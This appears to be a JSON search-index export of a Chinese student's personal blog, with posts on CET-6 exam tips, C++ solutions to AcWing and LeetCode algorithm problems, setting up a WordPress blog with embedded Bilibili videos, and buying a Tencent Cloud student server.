仔细阅读攻略如果你够牛逼，请真正做到仔细阅读，把他每一句话都读懂。但我们没那么牛逼，所以要取巧。仔细阅读，不必那么仔细。读不懂的地方先跳过，你要用短时间把全文看一遍，大致上了解这篇文章的意思。然后直接他妈的看问题，拿着问题再去对着文章读一遍！我这么做，仔细阅读最低正确率达到了80%。巅峰是90%。 长阅读攻略长阅读，顾名思义，文章很长。如果你想把整篇都读透读懂，你不是大神，就是傻逼。你要做的是快速阅读每一段，用极其精炼的语言标注这一段讲的大体意思，然后再读下一段，循环往复。当你第一遍浏览完了，标注完了，直接带着问题再快速扫一遍文章，找到意思相近的段落，八九不离十就是它了，请相信你的直觉。 听力也能撑起半壁江山我是黑龙江考生，2019年参加高考。当年我们英语考试并不考听力，所以我的听力基础为0.即便如此，我依然可以保证自己的听力正确率达到30%-40%。这已经很好了。怎么做？我们是大数据专业，请使用你的专业技能，对六级听力答案分布做一次数据分析，相信你会有自己的收获。我只能说，它是有规律的，最明显的规律，就是5a，5b，5c，5d起步。剩下的两项答案，随缘分配。 写作和翻译这俩我放在一块讲，因为他们是相辅相成的。写作和翻译是我的弱项，所以我没办法提供太好的建议，不够资格。我一般都是现场胡编乱造，用点高逼格的单词，写点曾经背过的超级屌的短句。 总结一下 听力部分尽量跟着听，用自己确定的选项，使用答案分布规律，换掉其他不确定的选项。 阅读理解部分，必须拿下长阅读和仔细阅读，把选词填空放弃腾出时间去做仔细阅读和长阅读也可以，但是你不能空着，要快速懵满。 写作和翻译部分，尽量用高级词汇替代低级词汇，用点高逼格的短语。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"},{"name":"考研","slug":"考研","permalink":"http://1905060202.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"英语","slug":"英语","permalink":"http://1905060202.github.io/tags/%E8%8B%B1%E8%AF%AD/"}]},{"title":"算法之简单模拟题（一）","date":"2021-08-16T17:45:49.000Z","path":"2021/08/17/算法之简单模拟题（一）/","text":"序列题目描述 Time Limit: 1000 msMemory Limit: 256 mb 1234567对于长度为6位的一个01串，每一位都可能是0或1，一共有64种可能。它的前几个是：000000000001000010000011000100请按从小到大的顺序输出这64种01串。 输入输出格式 输出描述: 1输出64行，每行一个01串。 思路12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int k[6] = &#123;0,0,0,0,0,0&#125;;int i = 0;int main()&#123; while(i&lt;64)&#123; int c = i; int j = 0; while(c)&#123; if(c&amp;1) k[j] = 1; //按位运算，如果位运算是1则更改数组的值。 else k[j] = 0; j++; c &gt;&gt;=1; &#125; cout &lt;&lt;k[5]&lt;&lt;k[4]&lt;&lt;k[3]&lt;&lt;k[2]&lt;&lt;k[1]&lt;&lt;k[0]&lt;&lt;endl; i++; &#125;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"N诺","slug":"N诺","permalink":"http://1905060202.github.io/tags/N%E8%AF%BA/"}]},{"title":"计算机考研法宝","date":"2021-08-16T13:34:52.000Z","path":"2021/08/16/计算机考研法宝/","text":"写在最前面胡小宁高考没有考入理想的大学是至今的遗憾，为了弥补这个遗憾，胡小宁一直在奋斗着。考研圆梦，毋庸置疑，是胡小宁最后的机会。谈到考研，它与高考不同，考研分为初试和复试。初试和复试同样重要。二者缺一不可。对于初试，胡小宁自己没什么经验，所以等成功上岸后会在这里总结自己的学习历程和学习经验。而对于复试，绝大多数学校都是以机试为主。所以计算机的复试方向很明确，就是要玩得转算法设计。胡小宁先在这里总结几个非常好的刷题网站，绝对霸道！ 刷题网站推荐ACWING这是北京大学的y神建立的网站，如果你觉得自己很牛皮，不如来这个网站感受一下什么是高山仰止。y神对于比较经典的题目，会有很详细的视频讲解，而且是free 的。它也有收费的活动，但绝对物超所值！ 点我进网站。 N诺此网站整合了许多高校考研复试机试真题，这还不去刷一刷？ 点我进网站。 leetcode不多说，懂得都懂。这个网站网址就不发了，连百度都能查得到- -。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"学生党","slug":"学生党","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E7%94%9F%E5%85%9A/"},{"name":"考研","slug":"考研","permalink":"http://1905060202.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"刷题","slug":"刷题","permalink":"http://1905060202.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"ACwing刷题之基本算法（位运算）","date":"2021-08-13T17:07:45.000Z","path":"2021/08/14/ACwing刷题之基本算法（位运算）/","text":"ACwing刷题之基本算法（位运算）a^b求 a的 b 次方对 p 取模的值。 输入格式 三个整数 a,b,p在同一行用空格隔开。 输出格式 输出一个整数，表示a^b mod p的值。 数据范围 0≤a,b≤10^9 1≤p≤10^9 输入样例： 13 2 7 输出样例： 12 思路本题要利用快速幂的思想。如果按暴力求解，那么求解百万次，O(n)的时间复杂度超级大。所以我们不妨换一种思路去求解，用数学的思维来分析如何精简计算步骤。 拿5来举例。5^7可以被拆解成什么呢？ (5^1)(5^2)(5^4) 1-&gt;2^0,2-&gt;2^1,4-&gt;2^2…以此类推， 倘若此时我们要算5^1000000。 我们可以算到2^19时停止，2^20本身&gt;=1000000(1024*1024&gt;1000000)。先算完上面的20个数。。然后看1000000的二进制怎么表示。11110100001001000000。找到了二进制，我们就把二进制对应位置的5^i乘进去。(因为同底指数相乘幂相加)。此时时间复杂度变成了O(logn)级别。 下面是代码实现： 12345678910111213141516#include &lt;iostream&gt;using namespace std;int main()&#123; int a, b, p; cin &gt;&gt; a &gt;&gt; b &gt;&gt; p; int res = 1%p;//先定义一个result。%p是为了防止测试数据模1. //从b的个位开始考虑 while(b)&#123; if(b&amp;1) res = res*1ll*a%p; //&amp;代表位运算,ill是long long类型的，目的是强制转换防止溢出 //不断地循环，要先把十位、百位、千位...准备好 a = a*1ll*a%p; b &gt;&gt;= 1;//把个位去掉 &#125; cout &lt;&lt; res &lt;&lt; endl; return 0;&#125; 一些知识点的补充 位运算符作用于位，并逐位执行操作。&amp;运算通常用于二进制取位操作，例如一个数 &amp;1的结果就是取二进制的最末位。 a&lt;&lt;b 表示把a转为二进制后左移b位（在后面添加 b个0）。例如100的二进制表示为1100100，100左移2位后（后面加2个零）：1100100&lt;&lt;2 =110010000 =400。 和&lt;&lt;相似，a&gt;&gt;b表示二进制右移b位（去掉末b位），相当于a除以2的b次方（取整）。 (a * b) % p = (a % p * b % p) % p 64位整数乘法求 a 乘 b 对 p 取模的值。 输入格式 第一行输入整数a，第二行输入整数b，第三行输入整数p。 输出格式 输出一个整数，表示a*b mod p的值。 数据范围 1≤a,b,p≤10^18 输入样例： 123345 输出样例： 12 思路本题和上题思路相同，利用快速幂的思想进行求解。a*b实际上是b个a相加。那么可以将b转化成二进制，然后利用位运算进行求解。 代码如下： 12345678910111213141516#include &lt;iostream&gt;using namespace std;typedef unsigned long long ull;//因为64位很大int main()&#123; ull a,b,p; cin &gt;&gt; a &gt;&gt; b &gt;&gt; p; ull res = 0; while(b)&#123; if(b &amp; 1) res =(res+a)%p; a = a*2%p; b &gt;&gt;=1;//去位 &#125; cout &lt;&lt; res; return 0;&#125; 最短Hamilton路径给定一张 n 个点的带权无向图，点从 0∼n−1 标号，求起点 0 到终点 n−1 的最短 Hamilton 路径。 Hamilton 路径的定义是从 0 到 n−1不重不漏地经过每个点恰好一次。 输入格式第一行输入整数 n。 接下来 n 行每行 n 个整数，其中第 i行第 j 个整数表示点 i到 j的距离（记为 a[i,j]）。 对于任意的 x,y,z，数据保证 a[x,x]=0，a[x,y]=a[y,x]并且 a[x,y]+a[y,z]≥a[x,z]。 输出格式输出一个整数，表示最短 Hamilton 路径的长度。 数据范围 1≤n≤20 0≤a[i,j]≤10^7 输入样例：12345650 2 4 5 12 0 6 5 34 6 0 8 35 5 8 0 51 3 3 5 0 输出样例：118","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"acwing","slug":"acwing","permalink":"http://1905060202.github.io/tags/acwing/"}]},{"title":"ACwing刷题之简单题（一）","date":"2021-08-13T13:19:20.000Z","path":"2021/08/13/ACwing刷题之简单题（一）/","text":"ACwing刷题之简单题（一）写在前面为了应付下学期的CCF考试，我在知乎上搜索刷题网站。看到有知乎er分享了这个acwing，打开之后很兴奋，这正是我想要的刷题网站。 从尾到头打印链表输入一个链表的头结点，按照 从尾到头 的顺序返回节点的值。 返回的结果用数组存储。 样例 12输入：[2, 3, 5]返回：[5, 3, 2] 思路12345678910111213141516171819/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: vector&lt;int&gt; printListReversingly(ListNode* head) &#123; vector&lt;int&gt; res;//创建一个容器，装一下链表中的元素 while(head)&#123; res.push_back(head-&gt;val); head = head-&gt;next; &#125; return vector&lt;int&gt; (res.rbegin(),res.rend());//构造一个新的vector，rbegin和rend是从尾到头遍历，begin和end是从头到尾遍历。 &#125;&#125;; 反转链表定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。 思考题： 请同时实现迭代版本和递归版本。 样例123输入:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出:5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL 思路(迭代)1234567891011121314151617181920212223/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if(!head || !head-&gt;next) return head; auto a = head,b = a-&gt;next; while(b)&#123; auto c = b-&gt;next; b-&gt;next = a; a = b; b = c; &#125; head-&gt;next = NULL; return a; &#125;&#125;; 思路（递归）12345678910111213141516171819/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if(!head || !head-&gt;next) return head; auto tail = reverseList(head-&gt;next); head-&gt;next-&gt;next = head; head-&gt;next = NULL; return tail; &#125;&#125;;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"acwing","slug":"acwing","permalink":"http://1905060202.github.io/tags/acwing/"}]},{"title":"2021暑假leetcode训练（四）","date":"2021-08-12T17:00:46.000Z","path":"2021/08/13/2021暑假leetcode训练（四）/","text":"初级算法（四）只出现一次的数字给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 示例 1: 12输入: [2,2,1]输出: 1 示例 2: 12输入: [4,1,2,1,2]输出: 4 思路 使用异或运算，将所有值进行异或 异或运算，相异为真，相同为假，所以 a^a = 0 ;0^a = a 因为异或运算 满足交换律 a^b^a = a^a^b = b 所以数组经过异或运算，单独的值就剩下了 12345678910class Solution &#123;public: int singleNumber(vector&lt;int&gt;&amp; nums) &#123; int res = 0; for(int i = 0;i&lt;nums.size();i++)&#123; res ^=nums[i]; &#125; return res; &#125;&#125;; 两个数组的交集 II给定两个数组，编写一个函数来计算它们的交集。 示例 1： 12输入：nums1 = [1,2,2,1], nums2 = [2,2]输出：[2,2] 示例 2: 12输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4]输出：[4,9] 说明： 输出结果中每个元素出现的次数，应与元素在两个数组中出现次数的最小值一致。我们可以不考虑输出结果的顺序。进阶： 如果给定的数组已经排好序呢？你将如何优化你的算法？ 如果 nums1 的大小比 nums2 小很多，哪种方法更优？ 如果 nums2 的元素存储在磁盘上，内存是有限的，并且你不能一次加载所有的元素到内存中，你该怎么办？ 思路 先对两个数组进行排序，然后使用两个指针，分别指向两个数组开始的位置。 如果两个指针指向的值相同，说明这个值是他们的交集，就把这个值加入到集合list中，然后两个指针在分别往后移一步。 如果两个指针指向的值不同，那么指向的值相对小的往后移一步，相对大的先不动，然后再比较 1234567891011121314151617181920212223242526class Solution &#123;public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123; sort(nums1.begin(),nums1.end()); sort(nums2.begin(),nums2.end()); int len1 = nums1.size(); int len2 = nums2.size(); //先对数组进行排序 vector&lt;int&gt; list;//建立list int first=0,second=0; while(first&lt;len1&amp;&amp;second&lt;len2)&#123; if(nums1[first]==nums2[second]) &#123; list.push_back(nums1[first]); first++; second++; &#125; else if(nums1[first]&gt;nums2[second])&#123; second++; &#125; else&#123; first++; &#125; &#125; return list; &#125;&#125;; 坑爹的事写完了代码，却一直无法AC。返回的list永远是空数组。我很纳闷，排查了一个小时左右。才是发现原来是给first和second的赋值问题。第一次写成int first,second=0;这种形式了。后来改成了int first=0,second=0;就通过了。他妈的！","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://1905060202.github.io/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"}]},{"title":"2021暑假leetcode训练（三）","date":"2021-08-12T09:28:23.000Z","path":"2021/08/12/2021暑假leetcode训练（三）/","text":"回文串与回文子序列问题（动态规划）写在前面今天瞟了一眼每日一题，发现是中等题目，于是我就打算解一下，结果我连题目都没读懂。 题目是516.最长回文子序列。 这道题目用到的解题技巧多数是动态规划。然鹅我并不懂什么是动态规划，好在下学期的《算法设计》里面会讲到。趁着如今还是暑假，我决定先把这块硬骨头啃掉，但是咱并不能一口吃个胖子，所以要循序渐进的一步一步来。 最长递增子序列给你一个整数数组 nums ，找到其中最长严格递增子序列的长度。 子序列是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。 示例 1： 123输入：nums = [10,9,2,5,3,7,101,18]输出：4解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。 示例 2： 12输入：nums = [0,1,0,3,2,3]输出：4 示例 3： 12输入：nums = [7,7,7,7,7,7,7]输出：1 提示： 1 &lt;= nums.length &lt;= 2500 -104 &lt;= nums[i] &lt;= 104 思路 dp[i]的定义 dp[i]表示i之前包括i的最长上升子序列。 状态转移方程 位置i的最长升序子序列等于j从0到i-1各个位置的最长升序子序列 + 1 的最大值。 所以：if (nums[i] &gt; nums[j]) dp[i] = max(dp[i], dp[j] + 1); 这一步要理解，目的就是为了更新dp[i]，每遍历一次对应位置的dp[i]都要被更新或不更新。dp[j]代表直到j这个位置的数字的最长子序列有多长，因为nums[i]&gt;nums[j]了，所以i这个位置的数字的最长子序列的长度肯定比j这个位置长，那么就dp[j]+1，然后再与目前dp[i]比一下大小，如果大就更新，如果小于或等于就不更新。这样可以确保，一次遍历后，dp[i]的值就是到i这个位置的最长子序列的长度。 dp[i]的初始化 每一个i，对应的dp[i]（即最长上升子序列）起始大小至少都是是1. 确定遍历顺序 dp[i] 是由0到i-1各个位置的最长升序子序列 推导而来，那么遍历i一定是从前向后遍历。 j其实就是0到i-1，遍历i的循环里外层，遍历j则在内层，代码如下： 123456for (int i = 1; i &lt; nums.size(); i++) &#123; for (int j = 0; j &lt; i; j++) &#123; if (nums[i] &gt; nums[j]) dp[i] = max(dp[i], dp[j] + 1); &#125; if (dp[i] &gt; res) res = dp[i]; // 取长的子序列&#125; C++代码如下： 123456789101112131415161718192021class Solution &#123;public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123; if(nums.size()&lt;2) return nums.size(); vector&lt;int&gt; dp(nums.size(), 1); //创建dp数组，记录每个dp[i]的严格最长升序子序列.创建了容器并初始化了容器。 int res = 1;//最大子序列现在是1 for(int i =1;i&lt;nums.size();i++) &#123; for(int j = 0;j&lt;i;j++)&#123; if(nums[i]&gt;nums[j]) dp[i] = max(dp[i],dp[j]+1); //判断dp[i]是否应该被更新，每遍历一次之后的dp[i]，就是到i这个位置的最长上升子序列的长度。 &#125; if(dp[i]&gt;res) res = dp[i]; &#125; return res; &#125;&#125;; 最长连续递增序列给定一个未经排序的整数数组，找到最长且 连续递增的子序列，并返回该序列的长度。 连续递增的子序列 可以由两个下标l和 r（l &lt; r）确定，如果对于每个 l &lt;= i &lt; r，都有 nums[i] &lt; nums[i + 1] ，那么子序列 [nums[l], nums[l + 1], ..., nums[r - 1], nums[r]] 就是连续递增子序列。 示例 1： 1234输入：nums = [1,3,5,4,7]输出：3解释：最长连续递增序列是 [1,3,5], 长度为3。尽管 [1,3,5,7] 也是升序的子序列, 但它不是连续的，因为 5 和 7 在原数组里被 4 隔开。 示例 2： 123输入：nums = [2,2,2,2,2]输出：1解释：最长连续递增序列是 [2], 长度为1。 提示： 1 &lt;= nums.length &lt;= 104 109 &lt;= nums[i] &lt;= 109 思路上面求最长升序子序列，并未要求连续。所以最长递增子序列，存在离散情况，需要使用j与i依次进行比较。但本题要求连续 ，所以不必使用j，即不必使用双重循环。一次for循环就好。 1234567891011121314151617class Solution &#123;public: int findLengthOfLCIS(vector&lt;int&gt;&amp; nums) &#123; if (nums.size()==0) return 0; int res = 1;//如果数组有元素，则最小连续子序列为1； vector&lt;int&gt; dp(nums.size() ,1);//创建容器并初始化。 for(int i = 0;i&lt;nums.size()-1;i++) &#123; if(nums[i+1]&gt;nums[i]) dp[i+1] = dp[i]+1;//如果位置在i+1的元素值比i位置的大，那么在对应的dp[i+1]中的长度自然就要比dp[i]大1； if(res&lt;dp[i+1]) res = dp[i+1]; &#125; return res; &#125;&#125;; 上面使用了dp数组，实际上不必另创数组。 1234567891011121314151617class Solution &#123;public: int findLengthOfLCIS(vector&lt;int&gt;&amp; nums) &#123; int sum = 1;//记录总长度 int count = 1;//记录连续数组的长度 for(int i = 0;i&lt;nums.size()-1;i++)&#123; if(nums[i]&lt;nums[i+1]) &#123; count++; sum = max(sum,count); &#125;else&#123; count = 1; &#125; &#125; return sum; &#125;&#125;; 在写这道题目的时候，突然啊想起来了训练2的买卖股票的最佳时机 II,于是就想着能不能用动态规划把那道题解一下。 1234567891011121314class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; int len = prices.size(); vector&lt;vector&lt;int&gt;&gt; dp(len, vector&lt;int&gt;(2, 0)); dp[0][0] -= prices[0]; dp[0][1] = 0; for (int i = 1; i &lt; len; i++) &#123; dp[i][0] = max(dp[i - 1][0], dp[i - 1][1] - prices[i]); dp[i][1] = max(dp[i - 1][1], dp[i - 1][0] + prices[i]); &#125; return dp[len - 1][1]; &#125;&#125;;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://1905060202.github.io/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"}]},{"title":"2021暑假leetcode训练（二）","date":"2021-08-10T15:00:11.000Z","path":"2021/08/10/2021暑假leetcode训练（二）/","text":"初级算法（二）买卖股票的最佳时机 II给定一个数组 prices ，其中 prices[i] 是一支给定股票第i 天的价格。 设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。 注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 示例 1:1234输入: prices = [7,1,5,3,6,4]输出: 7解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。 示例 2:1234输入: prices = [1,2,3,4,5]输出: 4解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。 示例 3: 123输入: prices = [7,6,4,3,1]输出: 0解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 提示： 1 &lt;= prices.length &lt;= 3 * 104 0 &lt;= prices[i] &lt;= 104 题解：123456789101112131415class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if(prices.size()&lt;2) return 0; int max = 0; int d = 0; for(int i=1;i&lt;prices.size();i++)&#123; d = prices[i]-prices[i-1]; if(d&gt;0) max+=d; &#125; return max; &#125;&#125;; 一些理解本题的思路是求解上升区间的高度和。 旋转数组给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 进阶： 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 你可以使用空间复杂度为 O(1) 的 原地 算法解决这个问题吗？ 示例 1:123456输入: nums = [1,2,3,4,5,6,7], k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4] 示例 2:12345输入：nums = [-1,-100,3,99], k = 2输出：[3,99,-1,-100]解释: 向右旋转 1 步: [99,-1,-100,3]向右旋转 2 步: [3,99,-1,-100] 提示： 1 &lt;= nums.length &lt;= 2 * 104 -231 &lt;= nums[i] &lt;= 231 - 1 0 &lt;= k &lt;= 105 题解1234567891011121314151617class Solution &#123;public: void rotate(vector&lt;int&gt;&amp; nums, int k) &#123; //创建临时数组 int len = nums.size(); int nums2[len]; for(int i = 0;i &lt; len;i++) &#123; int w = (i+k)%(len); nums2[w]=nums[i]; &#125; for(int i = 0;i &lt; len;i++) &#123; nums[i]=nums2[i]; &#125; &#125;&#125;; 作者：力扣 (LeetCode)链接：https://leetcode-cn.com/来源：力扣（LeetCode）","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://1905060202.github.io/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"}]},{"title":"wordpress之搭建博客","date":"2021-08-05T10:16:18.000Z","path":"2021/08/05/wordpress之搭建博客/","text":"写在最前面腾讯云检测到我的服务器有漏洞，这如同晴天霹雳，我这两天一直在搭建新的博客，完全没有深入配置服务器，这下可好，又要把搭建博客的工作先放一放了。不过，这两天的搭建工作确实让自己有了收获，这份收获在于如何用wordpress快速搭建起一个看着还过得去的blog 。 更换主题wordpress原生主题看着还过得去，不过我的审美被apple惯坏了，看着它扁平化和卡片化的设计，我也想把自己的博客改造成那般摸样。于是我的第一步工作就是更换一套主题。我选择的是Blocksy 。它卡片化的设计正合我意。 新建博客页面由于Blocksy面向的是商业，所以blog元素基本上没有。这就需要我手动建立一个blog页面。 新建页面 按图所示，顺序执行。 将blog添加到菜单 上面的方法不免有些繁琐，那是我第一次尝试所使用的方法。后来找到了更快捷的办法，一步到位 。 然后选择添加项目，如果你感觉菜单栏上的顺序不满意，可以选择第二步重新排序。 将blog页面设为文章页 选择设置-&gt;阅读 将blog设为文章页，大功告成！ 效果 建立网课资源页面这是今年暑假的一个目标，去实现一个网课转播平台。将优质的网课资源集中到数据社区 来，替同学们省去寻找网课的时间。 这将会是数据社区 的第一个功能，想想就令人激动！ 方法1-利用iframe将视频插入许多大型网站的内容都有“嵌入”选项，以iFrame代码提供其网站内容。 举了例子，如果你需要分享B站的视频，你只需要在具体的视频页面，点击视频播放器下方的分享按钮，即可看到嵌入代码，如下图所示： 单击“复制”按钮以复制代码。 然后，将该代码粘贴到WordPress网站上的任何文章或者页面。我 下面我们将演示将代码复制粘贴到页面的块编辑器（古腾堡编辑器）。 通过WordPress仪表板中的页面»新建页面，即可创建新页面。然后，将HTML块添加到这个页面。 然后，需要将B站的视频分享iFrame代码粘贴到该块中。 方法2-小石的方法虽然b站给的iFrame已经很棒了，但是在我的博客里视频的大小自适应的非常丑。于是我开始在网络上搜索解决方案，终于在小石的博客上看到了优雅的方法。 在html中写入如下代码： 1234&lt;iframe id=&quot;spkj&quot; src=&quot;https://player.bilibili.com/player.html?aid=视频AV号&amp;page=1&quot; width=&quot;100%&quot; frameborder=&quot;no&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;&lt;span data-mce-type=&quot;bookmark&quot; style=&quot;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&quot; class=&quot;mce_SELRES_start&quot;&gt;&lt;/span&gt; &lt;/iframe&gt;&lt;script type=&quot;text/javascript&quot;&gt; document.getElementById(&quot;spkj&quot;).style.height=document.getElementById(&quot;spkj&quot;).scrollWidth*0.76+&quot;px&quot;;&lt;/script&gt; 获取aid的方法： 红框内含视频的aid。 方法3-胡小宁的偷懒小妙招上述方法都带有一点雄心，就是把视频放在自己的网站上播放。我认为，还有一种更好的方法，就是通过card超链接的方式，直接跳到原视频处观看= = 。 效果： 建立每日英文页面胡小宁在21年9月份将进入大三学期，时光如梭，岁月无声，心中百感交集。对于如今的每一个大学生而言，到我这个阶段，就要开始思考未来的方向，是读研还是工作。胡小宁高考成绩是566分，没能考入传统的211/985读书，是至今的遗憾。所以，对于胡小宁来说，选择读研圆梦是不言而喻的。方才蹲坑的时候背单词，看到软件上有英文周刊，就点了进去，没想到要收费，这就让胡小宁很不爽。于是，我萌生了一个想法，那就是在数据社区建立一个学习英语的平台。我们自己办一个“英文日刊”！ 建立每日阅读第一个写好的部分是每日英文的页面与每日阅读的页面。胡小宁认为，英语得阅读者得天下。所以先做的工作，就是建立好每日阅读的页面。 每日阅读用到的插件是：Stackable 。 效果： 搭建英文周刊准备搭建一个英文周刊的页面，会有nature、the economist、the new yorker等周刊云集。但是搭建过程中遇到了一点障碍，就是pdf文件超过最大上传文件限制。所以要修改一下限制。 我要用到服务器提供的宝塔linux面板 。 修改文件最大上传文件限制。 重启服务器 ！ 一定要看完这里再继续阅读下面的宝塔linux方法，适用于你的网站一开始绑定的就是宝塔linux里面软件管理的php。我的php独立于宝塔，所以需要直接修改php.ini。 在宝塔linux软件管理安装php 修改nginx 搭建英文周刊页面文件最大post限制问题已经解决。 接下来就是写页面的工作emmm… 效果经过了30min 的忙碌，大功告成！！！","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"前端","slug":"前端","permalink":"http://1905060202.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"wordpress","slug":"wordpress","permalink":"http://1905060202.github.io/tags/wordpress/"}]},{"title":"腾讯云之购买与配置","date":"2021-08-03T16:52:22.000Z","path":"2021/08/04/腾讯云之购买与配置/","text":"写在最前面2021.8.3晚，为了支撑起日后云服务器 的费用，我放弃了自动续费两年的网易云会员，这是个悲伤的夜晚！ 服务器的购买我是个穷学生，连支付网易云会员都要考虑一下，按理来说应该租不起云服务器的。好在阿里云和腾讯云都给学生提供了极大的福利，可以超低的价格租一台云服务器。 点我进入学生优惠购买云服务器。 一年108元！真的便宜 有没有！ 我选择的是轻量应用服务器 ，因为可以选择镜像一键搭建好环境，如果你想手动搭建，那就选择购买云服务器 。选择它最直接的原因是可以极速搭建wordpress 。 操作系统我选择的是centos 。 服务器的搭建购买好后，进入控制台，点进实例，查看详情。 点击重置应用，便可选择要搭建的镜像。 我选择的是wordpress5.7.1社区版 